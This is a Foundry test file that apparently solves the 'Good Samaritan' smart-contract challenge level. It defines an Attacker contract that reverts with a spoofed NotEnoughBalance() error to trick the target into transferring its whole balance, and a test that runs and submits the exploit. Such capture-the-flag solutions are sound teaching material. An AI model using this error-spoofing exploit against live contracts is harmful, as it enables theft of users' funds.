// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IGoodSamaritan {
  function requestDonation() external returns(bool);
}

contract Attacker {
  IGoodSamaritan goodSamaritan;
  error NotEnoughBalance();

  constructor(address challengeAddress) {
    goodSamaritan = IGoodSamaritan(challengeAddress);
  }

  // goodSamaritan.requestDonation() will transfer the remainder
  // if the error NotEnoughBalance() is received.
  //
  // just make sure to not revert when you are getting the remainder!
  // In this particular case, checking the amount will suffice.
  function notify(uint256 amount) public pure {
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }

  function attack() public {
    goodSamaritan.requestDonation();
  }
}

contract GoodSamaritanTest is Test {
  address internal challengeAddress;
  Attacker attacker;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x8586Fe7809208B08691A1D225ab2648De02de76B);
    attacker = new Attacker(challengeAddress);
  }

  function testExploit() public {
    attacker.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
